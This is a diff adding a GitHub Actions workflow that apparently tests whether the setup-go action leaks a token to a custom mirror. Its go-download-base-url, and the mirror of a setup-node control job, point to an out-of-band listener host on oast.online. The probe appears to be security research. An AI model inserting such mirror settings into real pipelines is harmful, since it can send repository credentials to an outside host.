@@ -1,0 +1,27 @@
+name: sg028-mirror-token
+on:
+  push:
+    branches: [sg028]
+permissions:
+  contents: read
+jobs:
+  setup-go-custom-mirror:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-go@v7
+        continue-on-error: true
+        with:
+          go-version: '1.22.0'
+          check-latest: false
+          cache: false
+          go-download-base-url: https://db3ebr9hkp3mqcfst0dgzrpf7ojbp9sci.oast.online/dl
+      - run: echo "setup-go step finished (see listener for what the mirror received)"
+  control-setup-node-custom-mirror:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v5
+        continue-on-error: true
+        with:
+          node-version: '20.19.0'
+          mirror: https://db3ebr9hkp3mqcfst0dgzrpf7ojbp9sci.oast.online/node
+      - run: echo "setup-node step finished (control: sibling action with a mirror input)"
